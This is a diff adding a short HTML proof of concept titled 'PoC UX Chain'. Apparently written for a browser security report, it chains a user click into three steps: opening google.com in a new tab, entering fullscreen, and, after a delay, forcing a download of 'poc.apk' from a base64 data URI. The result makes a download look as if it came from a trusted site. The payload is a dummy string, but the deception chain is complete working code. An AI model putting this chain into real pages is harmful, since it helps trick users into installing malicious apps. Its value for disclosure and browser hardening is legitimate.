@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>PoC UX Chain</title>
+</head>
+<body>
+  <center><h2>Click to Continue</h2></center>
+  <input type="text" id="triggerInput" placeholder="Click here">
+
+  <script>
+    const payloadData = "ZXN0dGVzdGVzdHRlc3Q="; // dummy base64
+
+    document.getElementById('triggerInput').addEventListener('click', function handler() {
+      
+      // 1. Open trusted domain (user gesture)
+      const newTab = window.open('https://www.google.com/', '_blank');
+
+      // 2. Trigger fullscreen quickly (still inside gesture timing)
+      goFullScreen();
+
+      // 3. Delay download (simulate async payload)
+      setTimeout(() => {
+        triggerDownload();
+      }, 1500);
+
+    });
+
+    function triggerDownload() {
+      const link = document.createElement("a");
+      link.href = "data:application/octet-stream;base64," + payloadData;
+      link.download = "poc.apk";
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+    }
+
+    function goFullScreen() {
+      const el = document.documentElement;
+      if (el.requestFullscreen) {
+        el.requestFullscreen();
+      }
+    }
+  </script>
+</body>
+</html>
